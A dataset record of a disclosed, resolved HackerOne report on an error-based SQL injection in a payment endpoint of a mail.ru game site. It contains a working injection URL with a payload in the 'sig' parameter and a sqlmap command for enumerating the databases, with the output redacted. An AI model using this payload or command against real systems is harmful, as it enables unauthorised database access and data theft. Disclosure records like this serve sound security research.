---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '790005'
original_report_id: '790005'
title: 3igames.mail.ru SQL Injection
weakness: SQL Injection
team_handle: mailru
created_at: '2020-02-06T16:46:30.414Z'
disclosed_at: '2020-04-06T13:30:13.211Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 86
asset_identifier: Ext. B Scope
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- sql-injection
---

# 3igames.mail.ru SQL Injection

## Metadata

- HackerOne Report ID: 790005
- Weakness: SQL Injection
- Program: mailru
- Disclosed At: 2020-04-06T13:30:13.211Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Error based SQLi:

https://wrd-pay.3igames.mail.ru/?openid=21&appid=1&ts=12&payitem=2&token=1&billno=1&version=1&zoneid=1&providetype=1&amt=1&payamt_coins=1&pubacct_payamt_coins=1&sig=1%27,1,1,1,(select%20exp(~(select*from(select%20user())x))),1);--%20-

SQLMAP:

sqlmap -u "https://wrd-pay.3igames.mail.ru/?openid=21&appid=1&ts=12&payitem=2&token=1&billno=1&version=1&zoneid=1&providetype=1&amt=1&payamt_coins=1&pubacct_payamt_coins=1&sig=1%27,1,1,1,*,1);--%20-" --technique E --dbs

██████
[*██████
[*█████████
[*████
[*████████
[*████
[*████
[*██████████
[*██████████

## Impact

компрометация базы игры Меч короля: Начало

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
